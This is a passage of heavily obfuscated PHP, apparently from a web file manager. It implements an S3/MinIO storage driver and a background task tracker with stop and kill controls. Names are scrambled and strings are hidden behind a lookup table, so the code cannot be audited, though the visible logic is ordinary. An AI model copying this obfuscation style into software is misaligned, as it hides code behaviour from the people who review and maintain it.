($€±¦’©Ä[$ÕßÇ½Î[204]] as $®Ş‡¶¨º) { $Ñ¨Ö¦Ø¹ = $®Ş‡¶¨º[$ÕßÇ½Î[32]]; if ($Ñ¨Ö¦Ø¹ == $Œ¤¥×øî) { continue; } $ƒı¶Öóº = isset($®Ş‡¶¨º[$ÕßÇ½Î[76]]) ? $®Ş‡¶¨º[$ÕßÇ½Î[76]] : 0; $µò…¢ß = $ƒı¶Öóº == 0 && substr($Ñ¨Ö¦Ø¹, strlen($Ñ¨Ö¦Ø¹) - 1, 1) == $ÕßÇ½Î[8] ? !0 : !1; $this->cacheMethodInfoSet($Ñ¨Ö¦Ø¹, $µò…¢ß, $®Ş‡¶¨º); if ($µò…¢ß) { $ø¬¿ıÉï[] = $Ñ¨Ö¦Ø¹; continue; } $Ÿåè¡Â½[] = $ô½¶½şÛ ? $®Ş‡¶¨º : $Ñ¨Ö¦Ø¹; } foreach ($€±¦’©Ä[$ÕßÇ½Î[205]] as $®Ş‡¶¨º) { $ø¬¿ıÉï[] = $®Ş‡¶¨º[$ÕßÇ½Î[32]]; $this->cacheMethodInfoSet($®Ş‡¶¨º[$ÕßÇ½Î[32]], !0); } $this->cacheMethodInfoSet($ñÑÃâĞé, !0); return array($ÕßÇ½Î[82] => $ø¬¿ıÉï, $ÕßÇ½Î[83] => $Ÿåè¡Â½); } private function listObjs($îŒœšñô, $–ÖÜ‰®â = null, $¶º«şí = null, $º¤Ôœ‡è = null) { $´ ÆßÜ‘ =& $_SERVER[ì™ı‰º¯]; $îŒœšñô = trim($îŒœšñô, $´ ÆßÜ‘[8]); $¤œµİø = empty($îŒœšñô) && $îŒœšñô !== $´ ÆßÜ‘[198] ? $´ ÆßÜ‘[12] : $îŒœšñô . $´ ÆßÜ‘[8]; return $this->client->getBucket($this->bucket, $¤œµİø, $–ÖÜ‰®â, $¶º«şí, $º¤Ôœ‡è, !0); } public function has($§èºÈ¨ƒ, $ê¸¨‹ÉÌ = false, $ÈÚæÉâ« = true) { $ş§¦‰š½ =& $_SERVER[ì™ı‰º¯]; $§èºÈ¨ƒ = trim($§èºÈ¨ƒ, $ş§¦‰š½[8]); $µ¯ĞĞı• = empty($§èºÈ¨ƒ) && $§èºÈ¨ƒ !== $ş§¦‰š½[198] ? $ş§¦‰š½[12] : $§èºÈ¨ƒ . $ş§¦‰š½[8]; $ñÇ˜·Õ¨ = null; $Ã‰ÆÃĞ© = 500; $Ó—ãÇ«ë = $ş§¦‰š½[8]; $öÂ¤ûşá = $Âğ°ˆ–ó = array(); while (!0) { $ûìš„ø— = $this->listObjs($§èºÈ¨ƒ, $ñÇ˜·Õ¨, $Ã‰ÆÃĞ©, $Ó—ãÇ«ë); if (!$ûìš„ø—) { break; } $ñÇ˜·Õ¨ = $ûìš„ø—[$ş§¦‰š½[206]]; $½ë¿âù« = $ûìš„ø—[$ş§¦‰š½[204]]; $óáÙ­€Ú = $ûìš„ø—[$ş§¦‰š½[205]]; if (empty($½ë¿âù«) && empty($óáÙ­€Ú)) { break; } if (count($½ë¿âù«) == 1 && $½ë¿âù«[0][$ş§¦‰š½[32]] == $µ¯ĞĞı•) { break; } if ($ê¸¨‹ÉÌ) { if (count($½ë¿âù«)) { $½ë¿âù« = array_column($½ë¿âù«, $ş§¦‰š½[32]); $öÂ¤ûşá = array_merge($öÂ¤ûşá, $½ë¿âù«); } if (count($óáÙ­€Ú)) { $óáÙ­€Ú = array_column($óáÙ­€Ú, $ş§¦‰š½[32]); $Âğ°ˆ–ó = array_merge($Âğ°ˆ–ó, $óáÙ­€Ú); } if ($ñÇ˜·Õ¨ === null) { break; } continue; } if ($ÈÚæÉâ«) { if (!empty($½ë¿âù«)) { if (count($½ë¿âù«) > 1 || isset($½ë¿âù«[0][$ş§¦‰š½[32]]) && $½ë¿âù«[0][$ş§¦‰š½[32]] != $µ¯ĞĞı•) { return !0; } } } else { if (!empty($óáÙ­€Ú)) { return !0; } } if ($ñÇ˜·Õ¨ === null) { break; } } if ($ê¸¨‹ÉÌ) { $öÂ¤ûşá = array_diff($öÂ¤ûşá, array($µ¯ĞĞı•)); $öÂ¤ûşá = count(array_unique($öÂ¤ûşá)); $Âğ°ˆ–ó = count(array_unique($Âğ°ˆ–ó)); return array($ş§¦‰š½[207] => $öÂ¤ûşá, $ş§¦‰š½[208] => $Âğ°ˆ–ó); } return !1; } public function listAll($–õª¯©±) { $×Şöäç¸ =& $_SERVER[ì™ı‰º¯]; $Ø”Éù = $this->fileList($–õª¯©±, $×Şöäç¸[12], !0); $‰´‡¢ÛÃ = array_to_keyvalue($Ø”Éù[$×Şöäç¸[83]], $×Şöäç¸[32]); foreach ($Ø”Éù[$×Şöäç¸[82]] as $£Œ¤ƒĞ¦) { if (is_string($£Œ¤ƒĞ¦)) { $‰´‡¢ÛÃ[$£Œ¤ƒĞ¦] = array($×Şöäç¸[76] => 0); } } return $this->listAllFiles($–õª¯©±, $‰´‡¢ÛÃ); } public function canRead($û–™˜) { $éÛâ¿ƒ§ =& $_SERVER[ì™ı‰º¯]; $ğœˆŒ¥„ = $this->client->getAccessControlPolicy($this->bucket, $û–™˜); if (!$ğœˆŒ¥„) { return !1; } return in_array($ğœˆŒ¥„, array($éÛâ¿ƒ§[209], $éÛâ¿ƒ§[210], $éÛâ¿ƒ§[211])) ? !0 : !1; } public function canWrite($·‚‚äú”) { $ìáÌÜÏ‚ =& $_SERVER[ì™ı‰º¯]; $µì¶’Şµ = $this->client->getAccessControlPolicy($this->bucket, $·‚‚äú”); if (!$µì¶’Şµ) { return !1; } return in_array($µì¶’Şµ, array($ìáÌÜÏ‚[209], $ìáÌÜÏ‚[210])) ? !0 : !1; } public function getContent($Ç›ç¯Äì) { return $this->client->getObject($this->bucket, $Ç›ç¯Äì); } public function setContent($±ÂŸ˜ï, $ÂÍ…ØÎ‰ = '', $§ÁÃÙ£ü = false) { $¹½Š÷û =& $_SERVER[ì™ı‰º¯]; $±ÂŸ˜ï = $§ÁÃÙ£ü ? trim($±ÂŸ˜ï, $¹½Š÷û[8]) . $¹½Š÷û[8] : $±ÂŸ˜ï; $–œ¼â† = get_file_mime(get_path_ext($±ÂŸ˜ï)); $¸­øÊÈ = $this->client->putObject($ÂÍ…ØÎ‰, $this->bucket, $±ÂŸ˜ï, $¹½Š÷û[199], array(), $–œ¼â†); if (!$¸­øÊÈ) { return !1; } if ($§ÁÃÙ£ü) { return !0; } $this->cacheMethod(null, null); $¸­øÊÈ = $this->copyFile($±ÂŸ˜ï, $±ÂŸ˜ï, array($¹½Š÷û[212] => $¸­øÊÈ[$¹½Š÷û[213]])); return $¸­øÊÈ ? !0 : !1; } public function fileSubstr($¢ï ÚÑû, $×¯°ì›¾, $ƒ½²‡Áé) { $±‹õàµ = $×¯°ì›¾ + $ƒ½²‡Áé - 1; return $this->client->getObject($this->bucket, $¢ï ÚÑû, array($_SERVER[ì™ı‰º¯][214] => "\x62\x79\x74\x65\x73\75{$×¯°ì›¾}\x2d{$±‹õàµ}")); } public function upload($ÕÈíƒ¶, $„—Á’°Ò, $í¾­°œÍ = false, $îá´â›Ê = REPEAT_REPLACE) { $Í¾²÷×¨ =& $_SERVER[ì™ı‰º¯]; $¦Á›Ü£Ó = array($Í¾²÷×¨[212] => @md5_file($„—Á’°Ò)); $Æ¨ÌÈÅ¢ = array($Í¾²÷×¨[215] => get_file_mime(get_path_ext($ÕÈíƒ¶))); if (IO::size($„—Á’°Ò) <= 1024 * 1024 * 200) { $ó´ÛÄÒ = $this->client->putObjectFile($„—Á’°Ò, $this->bucket, $ÕÈíƒ¶, $Í¾²÷×¨[199], $¦Á›Ü£Ó, $Æ¨ÌÈÅ¢); return !empty($ó´ÛÄÒ) ? $this->getPathOuter($ÕÈíƒ¶) : !1; } $´É¤¬Õ† = $this->client->multiUploadObject($„—Á’°Ò, $this->bucket, trim($ÕÈíƒ¶, $Í¾²÷×¨[8]), $¦Á›Ü£Ó, $Æ¨ÌÈÅ¢); return $´É¤¬Õ† ? $this->getPathOuter($ÕÈíƒ¶) : !1; } public function download($°Ôˆõ¼, $º‰úµáŒ) { if (!@is_dir($this->pathFather($º‰úµáŒ)) && !IO::mkdir($this->pathFather($º‰úµáŒ))) { return !1; } $Ç­üï»ê = $this->client->getObject($this->bucket, $°Ôˆõ¼, array(), $º‰úµáŒ); return $Ç­üï»ê !== !1 ? $º‰úµáŒ : !1; } public function link($ÀÃ‰„‰—, $òß®°³ª = array()) { $µÄ’óĞŸ =& $_SERVER[ì™ı‰º¯]; if ($this->signVer == $µÄ’óĞŸ[216]) { return $this->client->getAuthenticatedURL($this->bucket, $ÀÃ‰„‰—, 3600 * 12, $òß®°³ª); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($ÀÃ‰„‰—, $µÄ’óĞŸ[8]), 3600 * 12, $this->region, array(), !0, $òß®°³ª); } public function fileOut($·òŸú×÷, $¥‘²”üø = false, $·¶øƒÉ± = false, $¡‰®ßœÌ = '') { $…û—ÊıÃ =& $_SERVER[ì™ı‰º¯]; if ($this->isFileOutServer()) { return $this->fileOutServer($·òŸú×÷, $¥‘²”üø, $·¶øƒÉ±, $¡‰®ßœÌ); } if (!$·¶øƒÉ±) { $·¶øƒÉ± = $this->pathThis($·òŸú×÷); } $ŠÑÓ›Ç÷ = get_file_mime(get_path_ext($·¶øƒÉ±)); if ($ŠÑÓ›Ç÷ == $…û—ÊıÃ[217]) { return parent::fileOut($·òŸú×÷, $¥‘²”üø, $·¶øƒÉ±, $¡‰®ßœÌ); } $±éÕØ = array($…û—ÊıÃ[218] => $ŠÑÓ›Ç÷); if ($¥‘²”üø) { $±éÕØ[$…û—ÊıÃ[219]] = $…û—ÊıÃ[220] . rawurlencode($·¶øƒÉ±); } else { } $ß›ò”©Õ = $this->link($·òŸú×÷, $±éÕØ); $this->fileOutLink($ß›ò”©Õ); } public function fileOutServer($´šÅöìá, $¦ûúøá× = false, $¼©–í® = false, $êÃÑ­¦Í = '') { parent::fileOut($´šÅöìá, $¦ûúøá×, $¼©–í®, $êÃÑ­¦Í); } public function fileOutImageServer($­‹üıß, $›ôã¨£â = 250) { parent::fileOutImage($­‹üıß, $›ôã¨£â); } public function hashMd5($³À‰ïíú, $¯ˆ ÎÏ» = '') { $›°„øí =& $_SERVER[ì™ı‰º¯]; $õ·¹ş«û = $this->objectMeta($³À‰ïíú); if (!$õ·¹ş«û) { return !1; } $¯ˆ ÎÏ» = $¯ˆ ÎÏ» ? $¯ˆ ÎÏ» : _get($õ·¹ş«û, $›°„øí[221]); $¯ˆ ÎÏ» = $¯ˆ ÎÏ» ? $¯ˆ ÎÏ» : _get($õ·¹ş«û, $›°„øí[213], $›°„øí[12]); return $¯ˆ ÎÏ»; } public function uploadFormData($Ùµİ¥¯, $Û–¹æ­† = 3600) { $°±ˆšÙà =& $_SERVER[ì™ı‰º¯]; $™½ÅÁ¹ = $this->pathFather($Ùµİ¥¯); $éÑÅ = $this->client->getHttpUploadPostParams($this->bucket, $™½ÅÁ¹, $°±ˆšÙà[199], $Û–¹æ­†); return array_merge((array) $éÑÅ, array($°±ˆšÙà[182] => $this->getHost())); } public function multiUploadFormData($¼À©¢÷, $ñ’°õ = 3600) { $¶Í‚ñ±¼ =& $_SERVER[ì™ı‰º¯]; $ı¶ñ…µ = gmdate($¶Í‚ñ±¼[222]); $¶íÉ‘ù = array(); $È‡§¬Á’ = $this->client->getUploadId($this->bucket, $¼À©¢÷, $¶íÉ‘ù); if (!$È‡§¬Á’) { return !1; } return array($¶Í‚ñ±¼[223] => $È‡§¬Á’, $¶Í‚ñ±¼[182] => $this->getHost() . $¶Í‚ñ±¼[8] . $this->pathEncode($¼À©¢÷), $¶Í‚ñ±¼[224] => $ı¶ñ…µ, $¶Í‚ñ±¼[94] => $¼À©¢÷); } public function multiUploadAuthData($³ºŸ»ß‘, $†³´¥ = array()) { $„ÁııÁ… =& $_SERVER[ì™ı‰º¯]; $Ç×£åî… = isset($†³´¥[$„ÁııÁ…[224]]) ? $†³´¥[$„ÁııÁ…[224]] : gmdate($„ÁııÁ…[222]); $ªÎªıÍØ = isset($†³´¥[$„ÁııÁ…[174]]) ? $†³´¥[$„ÁııÁ…[174]] : $„ÁııÁ…[12]; $´Üùß˜ß = $†³´¥[$„ÁııÁ…[94]]; unset($†³´¥[$„ÁııÁ…[94]]); if (isset($†³´¥[$„ÁııÁ…[225]])) { $†³´¥[$„ÁııÁ…[224]] = $Ç×£åî…; return $this->listUploadParts($´Üùß˜ß, $†³´¥); } $Óáı„Íâ = array($„ÁııÁ…[226], $„ÁııÁ…[12], $„ÁııÁ…[120], $„ÁııÁ…[12], "\x78\x2d\x61\x6d\172\x2d\x64\x61\x74\145\x3a{$Ç×£åî…}", $„ÁııÁ…[8] . $this->bucket . $„ÁııÁ…[8] . $this->pathEncode($´Üùß˜ß) . $ªÎªıÍØ); if (strpos($ªÎªıÍØ, $„ÁııÁ…[227]) === 0) { $Óáı„Íâ[0] = $„ÁııÁ…[228]; } if (isset($†³´¥[$„ÁııÁ…[229]]) && $†³´¥[$„ÁııÁ…[229]] == $„ÁııÁ…[230]) { $Óáı„Íâ[0] = $„ÁııÁ…[230]; } $–ŒØÙÅ = implode($„ÁııÁ…[231], $Óáı„Íâ); $øˆİ§Õ = base64_encode(hash_hmac($„ÁııÁ…[232], $–ŒØÙÅ, $this->secret, !0)); $Ãâñ¯ğ‹ = $„ÁııÁ…[233] . $this->accessKey . $„ÁııÁ…[4] . $øˆİ§Õ; if (strpos($ªÎªıÍØ, $„ÁııÁ…[227]) === 0) { return array($„ÁııÁ…[234] => $Ãâñ¯ğ‹, $„ÁııÁ…[224] => $Ç×£åî…); } return $Ãâñ¯ğ‹; } public function listUploadParts($Ùœ‘ĞÂä, $œ¶ÓŞğÂ = array()) { $ÏˆŒ´Î’ =& $_SERVER[ì™ı‰º¯]; $¡ñí’É = str_replace($ÏˆŒ´Î’[235], $ÏˆŒ´Î’[12], $œ¶ÓŞğÂ[$ÏˆŒ´Î’[174]]); $åšä³òÄ = $this->client->listParts($this->bucket, $Ùœ‘ĞÂä, $¡ñí’É); if (!$åšä³òÄ) { return !1; } unset($œ¶ÓŞğÂ[$ÏˆŒ´Î’[225]], $œ¶ÓŞğÂ[$ÏˆŒ´Î’[229]]); $œ¶ÓŞğÂ[$ÏˆŒ´Î’[94]] = $Ùœ‘ĞÂä; $ó¯Ü ­½ = $this->multiUploadAuthData($Ùœ‘ĞÂä, $œ¶ÓŞğÂ); if (empty($ó¯Ü ­½)) { return !1; } return array($ÏˆŒ´Î’[234] => $ó¯Ü ­½, $ÏˆŒ´Î’[224] => $œ¶ÓŞğÂ[$ÏˆŒ´Î’[224]], $ÏˆŒ´Î’[236] => $åšä³òÄ); } public function getHost() { return parent::getHost() . $_SERVER[ì™ı‰º¯][8] . $this->bucket; } public function size($½­¿“¨Í) { $…“Œüª± = $this->objectMeta($½­¿“¨Í); return $…“Œüª± ? $…“Œüª±[$_SERVER[ì™ı‰º¯][76]] : 0; } public function info($òÅÆå) { if ($this->isFolder($òÅÆå)) { return $this->folderInfo($òÅÆå); } else { if ($this->isFile($òÅÆå)) { return $this->fileInfo($òÅÆå); } } return !1; } public function exist($‚¢Â­‚¦) { return $this->isFile($‚¢Â­‚¦) || $this->isFolder($‚¢Â­‚¦); } public function isFile($¢çš‡ã¡) { return !$this->isFolder($¢çš‡ã¡) && $this->objectMeta($¢çš‡ã¡); } public function isFolder($€åó­ÏŸ) { return $this->cacheMethod($_SERVER[ì™ı‰º¯][165], $€åó­ÏŸ); } protected function objectMeta($ŒªïüóÀ) { return $this->cacheMethod($_SERVER[ì™ı‰º¯][167], $ŒªïüóÀ); } protected function _objectMeta($Å“—Ä·ì) { $‰Íô”Å =& $_SERVER[ì™ı‰º¯]; $Å“—Ä·ì = rtrim($Å“—Ä·ì, $‰Íô”Å[8]); try { $óÌğ³µ = $this->client->getObjectInfo($this->bucket, $Å“—Ä·ì); if (!isset($óÌğ³µ[$‰Íô”Å[221]]) && isset($óÌğ³µ[$‰Íô”Å[237]])) { $óÌğ³µ[$‰Íô”Å[221]] = $óÌğ³µ[$‰Íô”Å[237]]; } } catch (Exception $ ®ÎÙŠŸ) { $óÌğ³µ = !1; } if (!$óÌğ³µ) { } return $óÌğ³µ; } protected function _isFolder($³°£³ç‡) { $»ø²Øº¤ =& $_SERVER[ì™ı‰º¯]; $³°£³ç‡ = rtrim($³°£³ç‡, $»ø²Øº¤[8]); if ($³°£³ç‡ == $»ø²Øº¤[12] || $³°£³ç‡ == $»ø²Øº¤[8]) { return !0; } $éŠ÷¶şğ = $this->client->getBucket($this->bucket, $³°£³ç‡, null, 1); if (empty($éŠ÷¶şğ[$»ø²Øº¤[204]])) { return !1; } $”ÃÏ÷á¦ = $éŠ÷¶şğ[$»ø²Øº¤[204]][0][$»ø²Øº¤[32]]; return stripos($”ÃÏ÷á¦, $³°£³ç‡ . $»ø²Øº¤[8]) === 0 ? !0 : !1; if (substr($”ÃÏ÷á¦, -1) == $»ø²Øº¤[8]) { return !0; } if (get_path_this($”ÃÏ÷á¦) == get_path_this($³°£³ç‡)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($‡Çäê‚ª) { parent::__construct($‡Çäê‚ª); $this->signatureVersion($_SERVER[ì™ı‰º¯][216]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto Cê¸Êá¸¶º; a‡Š›’ªùÖ: class Task { const STATYS_STOP = "\163\164\x6f\160"; const STATYS_RUNNING = "\162\165\156\156\x69\156\x67"; const STATYS_KILL = "\x6b\151\x6c\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ÉëÑèí™, $ğˆéğ¥­ = '', $‘Ş•‹Òí = 0, $×¾¡ËÛÓ = '') { $¡›æ”ıù =& $_SERVER[ì™ı‰º¯]; if (self::get($ÉëÑèí™)) { return; } $this->task = array($¡›æ”ıù[399] => $ÉëÑèí™, $¡›æ”ıù[1670] => USER_ID, $¡›æ”ıù[1569] => $×¾¡ËÛÓ, $¡›æ”ıù[453] => $¡›æ”ıù[12], $¡›æ”ıù[33] => $ğˆéğ¥­, $¡›æ”ıù[1063] => $¡›æ”ıù[12], $¡›æ”ıù[782] => $‘Ş•‹Òí, $¡›æ”ıù[1671] => 0, $¡›æ”ıù[1672] => 0, $¡›æ”ıù[1673] => 0, $¡›æ”ıù[1674] => timeFloat(), $¡›æ”ıù[1675] => 0, $¡›æ”ıù[1676] => 0, $¡›æ”ıù[1677] => 0, $¡›æ”ıù[1678] => 0, $¡›æ”ıù[745] => $¡›æ”ıù[1629]); $GLOBALS[$¡›æ”ıù[1679]] = 1; Hook::bind($¡›æ”ıù[1634], array($this, $¡›æ”ıù[1680])); Hook::bind($¡›æ”ıù[1681], array($this, $¡›æ”ıù[1682])); $this->startAfter(); Hook::trigger($¡›æ”ıù[1683], $this->task); $this->task[$¡›æ”ıù[1676]] = timeFloat(); } public function end($Ï¢Ôùé€ = '') { $Ä¡ığ¾Ñ =& $_SERVER[ì™ı‰º¯]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$Ä¡ığ¾Ñ[1676]]) { self::valueSet($this->task[$Ä¡ığ¾Ñ[399]], !1); } $this->isEnd = !0; if ($Ï¢Ôùé€) { $this->task[$Ä¡ığ¾Ñ[453]] = $Ï¢Ôùé€; } self::log($Ä¡ığ¾Ñ[1684] . $this->task[$Ä¡ığ¾Ñ[399]] . $Ä¡ığ¾Ñ[1685] . sprintf($Ä¡ığ¾Ñ[846], timeFloat() - $this->task[$Ä¡ığ¾Ñ[1674]]) . $Ä¡ığ¾Ñ[1686]); Hook::unbind($Ä¡ığ¾Ñ[1634], array($this, $Ä¡ığ¾Ñ[1680])); Hook::unbind($Ä¡ığ¾Ñ[1681], array($this, $Ä¡ığ¾Ñ[1682])); $this->endAfter(); $×ĞŒíÃ¯ = $this->task; $this->task = !1; Hook::trigger($Ä¡ığ¾Ñ[1687], $×ĞŒíÃ¯); } public function update($£“ªƒÅÅ = 0, $ÌüÃ×³Ô = false) { $ŠÜ˜àŒ× =& $_SERVER[ì™ı‰º¯]; $ÙëŸ¿ÊÇ =& $this->task; if (!$ÙëŸ¿ÊÇ) { return; } $ÙëŸ¿ÊÇ[$ŠÜ˜àŒ×[1671]] += $£“ªƒÅÅ; $ÙëŸ¿ÊÇ[$ŠÜ˜àŒ×[1675]] = timeFloat(); if ($ÙëŸ¿ÊÇ[$ŠÜ˜àŒ×[782]]) { if ($ÙëŸ¿ÊÇ[$ŠÜ˜àŒ×[782]] < $ÙëŸ¿ÊÇ[$ŠÜ˜àŒ×[1671]]) { $ÙëŸ¿ÊÇ[$ŠÜ˜àŒ×[782]] = $ÙëŸ¿ÊÇ[$ŠÜ˜àŒ×[1671]]; } $ÆÈ«“úÒ = timeFloat() - $ÙëŸ¿ÊÇ[$ŠÜ˜àŒ×[1674]] - $ÙëŸ¿ÊÇ[$ŠÜ˜àŒ×[1677]]; if ($ÆÈ«“úÒ <= 0) { $ÆÈ«“úÒ = 0.001; } $ÙëŸ¿ÊÇ[$ŠÜ˜àŒ×[1672]] = $ÙëŸ¿ÊÇ[$ŠÜ˜àŒ×[1671]] / $ÙëŸ¿ÊÇ[$ŠÜ˜àŒ×[782]]; $ÙëŸ¿ÊÇ[$ŠÜ˜àŒ×[1673]] = $ÙëŸ¿ÊÇ[$ŠÜ˜àŒ×[1671]] / $ÆÈ«“úÒ; if ($ÙëŸ¿ÊÇ[$ŠÜ˜àŒ×[1672]] > 0) { $ÙëŸ¿ÊÇ[$ŠÜ˜àŒ×[1678]] = $ÆÈ«“úÒ * (1 - $ÙëŸ¿ÊÇ[$ŠÜ˜àŒ×[1672]]) / $ÙëŸ¿ÊÇ[$ŠÜ˜àŒ×[1672]]; } $ÙëŸ¿ÊÇ[$ŠÜ˜àŒ×[1678]] = $ÙëŸ¿ÊÇ[$ŠÜ˜àŒ×[1678]] <= 0 ? 0 : $ÙëŸ¿ÊÇ[$ŠÜ˜àŒ×[1678]]; } $this->updateAfter(); $ÔìŞ˜¹Ù = 0.2; if (timeFloat() - $ÙëŸ¿ÊÇ[$ŠÜ˜àŒ×[1676]] < $ÔìŞ˜¹Ù && !$ÌüÃ×³Ô) { return; } $Ó¼‘Åşò = self::get($ÙëŸ¿ÊÇ[$ŠÜ˜àŒ×[399]]); $Í¡âÆ¬® = $Ó¼‘Åşò[$ŠÜ˜àŒ×[745]]; if ($Í¡âÆ¬® == self::STATYS_KILL) { $ïßæã±² = array($ŠÜ˜àŒ×[1688] => LNG($ŠÜ˜àŒ×[1689]), $ŠÜ˜àŒ×[1211] => !1); Cache::set($ŠÜ˜àŒ×[1690] . $this->task[$ŠÜ˜àŒ×[399]], $ïßæã±², 30); $this->onKill(); $this->end(); die; } else { if ($Í¡âÆ¬® == self::STATYS_STOP) { $­¡¼ÍÙØ = 2; $Ó¼‘Åşò[$ŠÜ˜àŒ×[1677]] += $­¡¼ÍÙØ; self::valueSet($ÙëŸ¿ÊÇ[$ŠÜ˜àŒ×[399]], $Ó¼‘Åşò); sleep($­¡¼ÍÙØ); $this->update(); return; } } $ÙëŸ¿ÊÇ[$ŠÜ˜àŒ×[745]] = $Í¡âÆ¬® ? $Í¡âÆ¬® : $ÙëŸ¿ÊÇ[$ŠÜ˜àŒ×[745]]; $ÙëŸ¿ÊÇ[$ŠÜ˜àŒ×[1677]] = $Ó¼‘Åşò[$ŠÜ˜àŒ×[1677]] ? $Ó¼‘Åşò[$ŠÜ˜àŒ×[1677]] : 0; $ÙëŸ¿ÊÇ[$ŠÜ˜àŒ×[1676]] = timeFloat(); Hook::trigger($ŠÜ˜àŒ×[1691], $ÙëŸ¿ÊÇ); self::valueSet($ÙëŸ¿ÊÇ[$ŠÜ˜àŒ×[399]], $ÙëŸ¿ÊÇ); } public function onKillSet($ç›Î’À¤, $Ä“ŒğÂ× = array()) { $this->onKillCall = array($ç›Î’À¤, $Ä“ŒğÂ×); } public function onKill() { $†¶®³œŠ =& $_SERVER[ì™ı‰º¯]; self::log($†¶®³œŠ[1684] . $this->task[$†¶®³œŠ[399]] . $†¶®³œŠ[1692]); Hook::trigger($†¶®³œŠ[1693], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($¦–«¶ºü) { $ğïÁ¸±® =& $_SERVER[ì™ı‰º¯]; Cache::set($ğïÁ¸±®[1690] . $this->task[$ğïÁ¸±®[399]], $¦–«¶ºü, 60); return $¦–«¶ºü; } public static function get($Æã÷áÌ) { $Û…Ù©à =& $_SERVER[ì™ı‰º¯]; $Å›ÂØ‰å = self::valueGet($Æã÷áÌ); if (is_array($Å›ÂØ‰å) && $Å›ÂØ‰å[$Û…Ù©à[1694]]) { $Ïéè¶›ü = ActionApply($Å›ÂØ‰å[$Û…Ù©à[1694]], array($Å›ÂØ‰å)); $Å›ÂØ‰å = is_array($Ïéè¶›ü) ? $Ïéè¶›ü : $Å›ÂØ‰å; } return $Å›ÂØ‰å; } public static function listData() { $àÛéçáÒ = self::valueGet(); return array_sort_by($àÛéçáÒ, $_SERVER[ì™ı‰º¯][1674], !0); } public static function kill($øŒ«Ñ¤õ) { return self::changeStatus($øŒ«Ñ¤õ, self::STATYS_KILL); } public static function stop($êá“©) { return self::changeStatus($êá“©, self::STATYS_STOP); } public static function restart($›¹¦èš) { return self::changeStatus($›¹¦èš, self::STATYS_RUNNING); } public static function killAll() { $¿û©’ŸÓ =& $_SERVER[ì™ı‰º¯]; $şÅıæ‚³ = self::listData(); foreach ($şÅıæ‚³ as $çÊƒŞğ‹) { self::kill($çÊƒŞğ‹[$¿û©’ŸÓ[399]]); } sleep(2); foreach ($şÅıæ‚³ as $çÊƒŞğ‹) { self::valueSet($çÊƒŞğ‹[$¿û©’ŸÓ[399]], !1); } } private static function changeStatus($ûıÅè½±, $¸Ú™¾Ÿ’) { $ö‚ã‰Ô =& $_SERVER[ì™ı‰º¯]; $ÍøëİÒõ = self::valueGet($ûıÅè½±); if (!$ÍøëİÒõ) { return !1; } $ÍøëİÒõ[$ö‚ã‰Ô[745]] = $¸Ú™¾Ÿ’; self::valueSet($ûıÅè½±, $ÍøëİÒõ); self::log($ö‚ã‰Ô[1695] . $ÍøëİÒõ[$ö‚ã‰Ô[399]] . $ö‚ã‰Ô[1696] . $¸Ú™¾Ÿ’); return !0; } public static function valueGet($Íü¨·æ® = false) { $õ¿Ø²ö¸ =& $_SERVER[ì™ı‰º¯]; if ($Íü¨·æ®) { $ø£Ü×— = Model($õ¿Ø²ö¸[447])->where(array($õ¿Ø²ö¸[94] => $Íü¨·æ®, $õ¿Ø²ö¸[33] => $õ¿Ø²ö¸[1070]))->find(); return $ø£Ü×— ? json_decode($ø£Ü×—[$õ¿Ø²ö¸[374]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($†„ôÕé† = false) { $­İşÇ¯Ù =& $_SERVER[ì™ı‰º¯]; $¤•¢´¬× = array($­İşÇ¯Ù[33] => $­İşÇ¯Ù[1070]); if ($†„ôÕé†) { $¤•¢´¬×[$­İşÇ¯Ù[1670]] = $†„ôÕé†; } $ûİîùç = Model($­İşÇ¯Ù[447])->where($¤•¢´¬×)->select(); $ûİîùç = $ûİîùç ? $ûİîùç : array(); foreach ($ûİîùç as $‘ù¥öÌ¯ => $°°çğ²) { $ûİîùç[$‘ù¥öÌ¯] = json_decode($°°çğ²[$­İşÇ¯Ù[374]], !0); } return $ûİîùç; } public static function valueSet($Á…¢‹®ã, $‡ƒ¨˜¶») { $Â³‚™Œ  =& $_SERVER[ì™ı‰º¯]; if (!$‡ƒ¨˜¶») { return Model($Â³‚™Œ [447])->where(array($Â³‚™Œ [94] => $Á…¢‹®ã, $Â³‚™Œ [33] => $Â³‚™Œ [1070]))->delete(); } $€ú–ğ¿ = json_encode($‡ƒ¨˜¶»); if (!$€ú–ğ¿) { ob_start(); var_dump($‡ƒ¨˜¶»); $ò´ò×şù = ob_get_clean(); self::log($Â³‚™Œ [1697] . json_encode_force($ò´ò×şù)); } if (!$Á…¢‹®ã || !$‡ƒ¨˜¶»[$Â³‚™Œ [399]]) { return !1; } $ÜŒ‹»œ = array($Â³‚™Œ [33] => $Â³‚™Œ [1070], $Â³‚™Œ [1670] => USER_ID, $Â³‚™Œ [94] => $Á…¢‹®ã, $Â³‚™Œ [374] => $€ú–ğ¿); $Šƒ÷‡ = $Â³‚™Œ [1698]; CacheLock::lock($Šƒ÷‡); Model($Â³‚™Œ [447])->add($ÜŒ‹»œ, array(), !0); CacheLock::unlock($Šƒ÷‡); } public static function log($‹¤îúˆ³) { if (!GLOBAL_DEBUG) { return; } write_log($‹¤îúˆ³, $_SERVER[ì™ı‰º¯][1699]); } } class TaskFileTransfer extends Task { protected function startAfter() { $’ş·†—Ã =& $_SERVER[ì™ı‰º¯]; $æş°èšä =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($’ş·†—Ã[1700], array($this, $’ş·†—Ã[1701])); Hook::bind($’ş·†—Ã[1222], array($this, $’ş·†—Ã[1702])); Hook::bind($’ş·†—Ã[1703], array($this, $’ş·†—Ã[1704])); Hook::bind($’ş·†—Ã[596], array($this, $’ş·†—Ã[1705])); Hook::bind($’ş·†—Ã[597], array($this, $’ş·†—Ã[1706])); Hook::bind($’ş·†—Ã[602], array($this, $’ş·†—Ã[1707])); Hook::bind($’ş·†—Ã[603], array($this, $’ş·†—Ã[1708])); 